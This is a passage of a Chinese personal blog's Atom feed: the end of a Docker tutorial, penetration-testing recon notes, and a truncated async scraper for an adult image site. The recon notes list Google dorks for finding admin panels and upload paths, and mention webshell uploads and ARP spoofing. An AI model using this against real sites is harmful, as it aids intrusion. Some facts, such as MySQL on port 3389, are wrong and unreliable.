<span class="built_in">cp</span> <span class="built_in">id</span>:容器内路径 目标主机路径</span><br></pre></td></tr></table></figure><h2 id="实例-安装nginx"><a href="#实例-安装nginx" class="headerlink" title="实例-安装nginx"></a>实例-安装nginx</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>.搜索镜像</span><br><span class="line"><span class="attribute">docker</span> search nginx</span><br><span class="line"></span><br><span class="line"><span class="attribute">2</span>.拉取镜像</span><br><span class="line"><span class="attribute">docker</span> pull nginx</span><br><span class="line"></span><br><span class="line"><span class="attribute">3</span>.启动并映射到本地<span class="number">3344</span>端口</span><br><span class="line"><span class="attribute">docker</span> run -d --name nginx01 -p <span class="number">3344</span>:<span class="number">80</span> nginx</span><br><span class="line"></span><br><span class="line"><span class="attribute">4</span>.测试</span><br><span class="line"><span class="attribute">curl</span> localhost:<span class="number">3344</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">5</span>.进入容器</span><br><span class="line"><span class="attribute">docker</span> exec -it nginx01 /bin/bash</span><br></pre></td></tr></table></figure><h2 id="实例-安装tomcat"><a href="#实例-安装tomcat" class="headerlink" title="实例-安装tomcat"></a>实例-安装tomcat</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>拉取镜像</span><br><span class="line">官方版</span><br><span class="line">docker <span class="built_in">run</span> -<span class="keyword">it</span> <span class="comment">--rm tomcat:9.0 #没有此镜像就会去自动下载,--rm退出后就删除镜像,一般用于测试</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>拉取镜像</span><br><span class="line">docker -pull tamcat</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>启动并映射</span><br><span class="line">docker <span class="built_in">run</span> -d -p <span class="number">3355</span>:<span class="number">8080</span> <span class="comment">--name tomcat01 tomcat</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>测试访问,发现<span class="number">404</span></span><br><span class="line">curl localhost:<span class="number">3355</span></span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>进入容器</span><br><span class="line">docker exec -<span class="keyword">it</span> tomcat01 /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>拷贝</span><br><span class="line">cp -r webapps.dist/* webapps/</span><br></pre></td></tr></table></figure><h2 id="commit镜像"><a href="#commit镜像" class="headerlink" title="commit镜像"></a>commit镜像</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker commit 提交容器成为一个新的副本</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">与git相似</span></span><br><span class="line">docker commit -m=&#x27;提交的描述信息&#x27; -a=&#x27;作者&#x27; 容器id 目标镜像名:[tag]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">1.利用原来的tomcat制作一个新镜像</span></span><br><span class="line">docker commit -a=&#x27;chenci&#x27; -m=&#x27;add webapps&#x27; id tomcat02:1.0</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为了容器的持久化和同步操作</span><br></pre></td></tr></table></figure><p><strong>使用数据卷</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">挂载</span><br><span class="line">docker run -it -v 主机目录:容器目录</span><br></pre></td></tr></table></figure><p><strong>测试同步mysql</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">1.启动并映射端口,设置密码</span></span><br><span class="line">docker run -d -p 3310:3306 -v /Users/chenci/guazai/mysql:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name some-mysql mysql:5.7</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">2.远程连接</span></span><br><span class="line">mysql -uroot -p123456 -h 10.30.3.100 -P 3310</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">3.在远程连接中创建数据库测试</span></span><br><span class="line">测试无误,本地和容器中都会多一个测试数据库</span><br></pre></td></tr></table></figure><p><strong>具名和匿名挂载</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">只写了容器内的路径,就是匿名挂载</span></span><br><span class="line">docker run -it -P --name nginx -V /path id</span><br><span class="line"><span class="meta">#</span><span class="language-bash">查看</span></span><br><span class="line">local     6c71f963cc89b24d16b4b47cb35df42445ff9d9395753b192ba72cbbbc22d583</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">写了名字就是具名挂载</span></span><br><span class="line">docker run -it -P --name nginx -V juming /path id</span><br><span class="line"><span class="meta">#</span><span class="language-bash">查看</span></span><br><span class="line">local     juming</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">查看所有的volume</span></span><br><span class="line">docker volume ls</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">查看卷</span></span><br><span class="line">docker volume inspect juming</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong><code>通过具名可以方便找到一个卷通所以一般使用具名挂载</code></strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-v 容器内路径 #匿名挂载</span><br><span class="line">-v 卷名:容器内路径 #匿名挂载</span><br></pre></td></tr></table></figure><p><strong><code>扩展</code></strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">在路径后面跟:ro或则rw</span></span><br><span class="line">ro表示这个路径只能通过宿主机来操作,容器内部无法操作</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;docker帮助命令&quot;&gt;&lt;a href=&quot;#docker帮助命令&quot; class=&quot;headerlink&quot; title=&quot;docker帮助命令&quot;&gt;&lt;/a&gt;docker帮助命令&lt;/h2&gt;&lt;figure class=&quot;highlight jboss-cli&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;docker &lt;span class=&quot;keyword&quot;&gt;version&lt;/span&gt; 显示版本信息&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker &lt;span class=&quot;keyword&quot;&gt;help&lt;/span&gt; 帮助&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker info 基本信息&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;docker镜像命令&quot;&gt;&lt;a href=&quot;#docker镜像命令&quot; class=&quot;headerlink&quot; title=&quot;docker镜像命令&quot;&gt;&lt;/a&gt;docker镜像命令&lt;/h2&gt;&lt;figure class=&quot;highlight dsconfig&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;docker&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;images&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 可选项&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-&lt;span class=&quot;string&quot;&gt;a&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;--all&lt;/span&gt;   &lt;span class=&quot;comment&quot;&gt;# 列出所有镜像&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-&lt;span class=&quot;string&quot;&gt;q&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;--quite&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;# 只显示镜像的id&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&quot;docker-search-搜索镜像&quot;&gt;&lt;a href=&quot;#docker-search-搜索镜像&quot; class=&quot;headerlink&quot; title=&quot;docker search 搜索镜像&quot;&gt;&lt;/a&gt;docker search 搜索镜像&lt;/h4&gt;</summary>
    
    
    
    <category term="工具使用" scheme="http://example.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
    <category term="教程" scheme="http://example.com/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="docker" scheme="http://example.com/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>信息收集</title>
    <link href="http://example.com/2022/04/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://example.com/2022/04/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2022-04-17T11:52:17.000Z</published>
    <updated>2022-05-15T06:08:40.522Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息收集流程框架"><a href="#信息收集流程框架" class="headerlink" title="信息收集流程框架"></a>信息收集流程框架</h1><pre><code>web安全的本质是信息收集,信息收集的广度决定了渗透测试的深度</code></pre><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151406722.png?token=ARYCSAQD6OKJD27QWBHELEDCQCML2"></p><h1 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h1><p>利用谷歌强大的搜索引擎,经常会有意想不到的的收获</p><h2 id="基本的搜索"><a href="#基本的搜索" class="headerlink" title="基本的搜索"></a>基本的搜索</h2><ul><li>逻辑与 and</li><li>逻辑或 or</li><li>逻辑非 </li><li>通配符 *</li></ul><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>intext寻找网页正文中的关键字,如: intext后台登录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151407831.png?token=ARYCSAWV4LKDZRPCSEVF6JTCQCMMU"></p><p>intitle寻找网页标题中的关键字,如: intitle</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151407472.png?token=ARYCSARBOVPDEZB5OZMIVK3CQCMNG"></p><p>allintitle用法和intitle差不多,差别在于可指定多个关键字<br>inurl返回url中含有关键字的网页,如: inurl:login</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151407166.png?token=ARYCSAQ3SFZMMU3UYVUJCGLCQCMOQ"></p><p>查找管理员登录界面</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151407174.png?token=ARYCSAQOLC655DBNNP7VXPLCQCMPK"></p><p>查找phpmyadmin</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151408516.png?token=ARYCSASH2YTTZCBNY6FPUJDCQCMQG"></p><p>allinurl和inurl的用法差不多,差别在于可指定多个关键字<br>site指定访问的网站,如,site:baidu.com inurl:login</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151408454.png?token=ARYCSARRLHPP2UJ4SQO2VWLCQCMQY"></p><h2 id="查找网站后台"><a href="#查找网站后台" class="headerlink" title="查找网站后台"></a>查找网站后台</h2><ul><li>site:xx.com intext:管理</li><li>site:xx.com inurl:login</li><li>site:xx.com intitle:后台</li></ul><h2 id="查看服务器使用的程序"><a href="#查看服务器使用的程序" class="headerlink" title="查看服务器使用的程序"></a>查看服务器使用的程序</h2><ul><li>site:xx.com filetype:asp</li><li>site:xx.com filetype:php</li><li>site:xx.com filetype:jsp</li><li>site:xx.com filetype:aspx</li></ul><h2 id="查看上传漏洞"><a href="#查看上传漏洞" class="headerlink" title="查看上传漏洞"></a>查看上传漏洞</h2><ul><li>site:xx.com inurl:file</li><li>site:xx.com inurl:load</li></ul><h1 id="dns域名信息"><a href="#dns域名信息" class="headerlink" title="dns域名信息"></a>dns域名信息</h1><p>首先是对应域名的ip,域名注册人,邮箱,dns,子域名之类的信息</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151408552.png?token=ARYCSAXOYDDMLZE6YSW4UZLCQCMRI"></p><h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><ul><li>然后判断是否有cdn    <a href="http://cdn.chinaz.com/">http://cdn.chinaz.com</a></li><li>也可以使用不同地区的电脑ping,看ip是否是同一个</li><li>如果查询出的ip有多个就说明使用了cdn</li></ul><h2 id="CDN查询"><a href="#CDN查询" class="headerlink" title="CDN查询"></a>CDN查询</h2><ul><li>绕过cdn查询真实ip <a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> 微步</li></ul><h1 id="整站分析"><a href="#整站分析" class="headerlink" title="整站分析"></a>整站分析</h1><p>服务器类型</p><ul><li>服务器平台,版本等<br>网站容器</li><li>搭建网站的服务组件,如:iis,apache,nginx等等<br>脚本类型</li><li>常见的有asp,php,jsp,aspx<br>数据库类型</li><li>常见的有access,sqlserver,mysql,oracle<br>cms类型</li><li>网站模板<br>waf</li><li>安全防护软件</li></ul><h2 id="服务器类型-windows-x2F-linux"><a href="#服务器类型-windows-x2F-linux" class="headerlink" title="服务器类型(windows&#x2F;linux)"></a>服务器类型(windows&#x2F;linux)</h2><ul><li>nmap 扫描</li><li>google抓包分析</li></ul><h2 id="网站容器-iis-apache-nginx"><a href="#网站容器-iis-apache-nginx" class="headerlink" title="网站容器(iis,apache,nginx)"></a>网站容器(iis,apache,nginx)</h2><p>知道网站容器很重要,如iis6.0的解析漏洞,ngixn&lt;0.83的解析漏洞.,iis7.0的畸形解析漏洞等等</p><ul><li>nmap 扫描</li><li>google抓包分析</li></ul><h2 id="脚本类型-php-jsp-asp-aspx等"><a href="#脚本类型-php-jsp-asp-aspx等" class="headerlink" title="脚本类型(php,jsp,asp,aspx等)"></a>脚本类型(php,jsp,asp,aspx等)</h2><ul><li>根据网站的url</li><li>直接打开一个展示页面查看</li><li>根据firefox的插件查看</li></ul><h2 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h2><ul><li>mysql端口为3389,数据库后缀名.sql</li><li>sqlserver端口为1433,数据库后缀名.mdf</li><li>access后缀名为.mdb</li><li>oraacle,端口为1521</li></ul><p>一般的常见搭配为</p><ul><li>ASP和ASPX:access,sqlserver</li><li>PHP:mysql</li><li>JSP:oracle,mysql</li></ul><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>扫描目标开放了哪些端口,如常见的135,137,445经常爆发出漏洞</p><ul><li>21,22,23,3389    ftp,ssh,telnet,windows远程桌面</li><li>873 rsync 未授权访问漏洞</li><li>3306 mysql 弱口令</li><li>6379 redis未授权访问漏洞</li></ul><h2 id="网站敏感目录和文件"><a href="#网站敏感目录和文件" class="headerlink" title="网站敏感目录和文件"></a>网站敏感目录和文件</h2><ul><li>后台目录:万能密码,弱口令,爆破</li><li>安装包:获取数据库信息,甚至是网站源码</li><li>上传目录:上传木马,一句话等</li><li>mysql管理接口:爆破,弱口令,万能密码,甚至能直接拿shell</li><li>phpinfo:暴露各种配置信息</li><li>编辑器:各种畸形漏洞</li><li>robots.txt</li></ul><h2 id="旁站和C段"><a href="#旁站和C段" class="headerlink" title="旁站和C段"></a>旁站和C段</h2><ul><li><p>旁站指的是同一服务器上得不同网站,如果你拿不下这个网站,不如试试旁站.拿下旁站webshell,再提权也就拿下了这个网站了</p></li><li><p>C段指的是同一网段的其他服务器,192.168.0.1,0就是C段.如果拿下了C段中一台服务器,就可使用嗅探工具,arp欺骗等劫持流量,找到关键信息,拿下服务器</p></li><li><p>旁站查询:<a href="http://s.tool.chinaz.com/same">http://s.tool.chinaz.com/same</a></p></li><li><p>C段查询:<a href="http://www.webscan.cc/">http://www.webscan.cc/</a></p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;信息收集流程框架&quot;&gt;&lt;a href=&quot;#信息收集流程框架&quot; class=&quot;headerlink&quot; title=&quot;信息收集流程框架&quot;&gt;&lt;/a&gt;信息收集流程框架&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;web安全的本质是信息收集,信息收集的广度决定了渗透测试的深度
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202205151406722.png?token=ARYCSAQD6OKJD27QWBHELEDCQCML2&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;google-hacking&quot;&gt;&lt;a href=&quot;#google-hacking&quot; class=&quot;headerlink&quot; title=&quot;google hacking&quot;&gt;&lt;/a&gt;google hacking&lt;/h1&gt;&lt;p&gt;利用谷歌强大的搜索引擎,经常会有意想不到的的收获&lt;/p&gt;</summary>
    
    
    
    <category term="笔记" scheme="http://example.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="信息收集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>异步协程爬取福利姬</title>
    <link href="http://example.com/2022/04/14/%E5%BC%82%E6%AD%A5%E7%88%AC%E5%8F%96%E6%9F%90%E6%B6%A9%E6%83%85%E7%BD%91%E7%AB%99%E5%9B%BE%E7%89%87/"/>
    <id>http://example.com/2022/04/14/%E5%BC%82%E6%AD%A5%E7%88%AC%E5%8F%96%E6%9F%90%E6%B6%A9%E6%83%85%E7%BD%91%E7%AB%99%E5%9B%BE%E7%89%87/</id>
    <published>2022-04-14T08:16:16.000Z</published>
    <updated>2022-05-15T06:24:18.666Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">-------------------------------------------------</span></span><br><span class="line"><span class="string">   File Name：     协程4-实战爬取tuao8.com</span></span><br><span class="line"><span class="string">   Author :       chenci</span></span><br><span class="line"><span class="string">   date：          2022/3/25</span></span><br><span class="line"><span class="string">-------------------------------------------------</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> aiofiles</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_dir_not_exist</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">        os.makedirs(path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 抓取每个条目的图集</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_photos_url</span>():</span><br><span class="line">    resp = requests.get(url=<span class="string">&#x27;https://www.tuao8.xyz/category-2_1.html&#x27;</span>, headers=header)</span><br><span class="line">    text = etree.HTML(resp.text)</span><br><span class="line">    href_url_list = text.xpath(<span class="string">&#x27;//*[@id=&quot;container&quot;]/main/article/div/a/@href&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> href_url_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 去请求每个图集.返回源码</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">get_photos</span>(<span class="params">photo_list</span>):</span><br><span class="line">    <span class="comment"># 限制并发熟路默认100,0为无限制</span></span><br><span class="line">    conn = aiohttp.TCPConnector(limit=<span class="number">10</span>)</span><br><span class="line">    <span class="comment"># 发送请求</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession(connector=conn) <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> <span class="keyword">await</span> session.get(url=photo_list, headers=header) <span class="keyword">as</span> resp:</span><br><span class="line">            page_text = <span class="keyword">await</span> resp.text()</span><br><span class="line">            <span class="keyword">await</span> get_photos_title_page(page_text, photo_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从每个源码里筛选出标题和最大页码,url</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">get_photos_title_page</span>(<span class="params">text, url</span>):</span><br><span class="line">    tasks = []</span><br><span class="line">    html = etree.HTML(text)</span><br><span class="line">    title = html.xpath(<span class="string">&#x27;//*[@id=&quot;container&quot;]/main/article/h1/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    max_page = <span class="built_in">int</span>(html.xpath(<span class="string">&#x27;//*[@id=&quot;dm-fy&quot;]/li[last()-1]/a/text()&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">    create_dir_not_exist(<span class="string">f&#x27;./imgs/tuzo_xc/<span class="subst">&#123;title&#125;</span>&#x27;</span>)</span><br><span class="line">    task = asyncio.create_task(get_download_url(url=url, title=title, max_page=max_page))</span><br><span class="line">    tasks.append(task)</span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取每一页的url并从源码中筛选出每张图片的下载链接</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">get_download_url</span>(<span class="params">url, title, max_page</span>):</span><br><span class="line">    tasks = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_page):</span><br><span class="line">        urls = <span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>?page=<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">        conn = aiohttp.TCPConnector(limit=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession(connector=conn) <span class="keyword">as</span> session:</span><br><span class="line">            <span class="keyword">async</span> <span class="keyword">with</span> <span class="keyword">await</span> session.get(url=urls, headers=header) <span class="keyword">as</span> resp:</span><br><span class="line">                page_text = <span class="keyword">await</span> resp.text()</span><br><span class="line">                html = etree.HTML(page_text)</span><br><span class="line">                image_url = html.xpath(<span class="string">&#x27;//*[@class=&quot;entry&quot;]//img/@src&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                task = asyncio.create_task(download_image(image_url, title, i))</span><br><span class="line">                tasks.append(task)</span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">download_image</span>(<span class="params">image_url, title, i</span>):</span><br><span class="line">    conn = aiohttp.TCPConnector(limit=<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession(connector=conn) <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">async</span> <span class="keyword">with</span> <span class="keyword">await</span> session.get(url=image_url, headers=header) <span class="keyword">as</span> resp:</span><br><span class="line">                <span class="built_in">print</span>(image_url)</span><br><span class="line">                <span class="keyword">async</span> <span class="keyword">with</span> aiofiles.<span class="built_in">open</span>(<span class="string">f&#x27;./imgs/<span class="subst">&#123;title&#125;</span>/<span class="subst">&#123;i&#125;</span>.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;正在下载<span class="subst">&#123;title&#125;</span>  第<span class="subst">&#123;i&#125;</span>张&#x27;</span>)</span><br><span class="line">                    <span class="keyword">await</span> f.write(<span class="keyword">await</span> resp.read())</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;下载完成&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    href_url_list = get_photos_url()</span><br><span class="line">    tasks = []</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> href_url_list:</span><br><span class="line">        task = asyncio.create_task(get_photos(photo_list=url))</span><br><span class="line">        tasks.append(task)</span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == 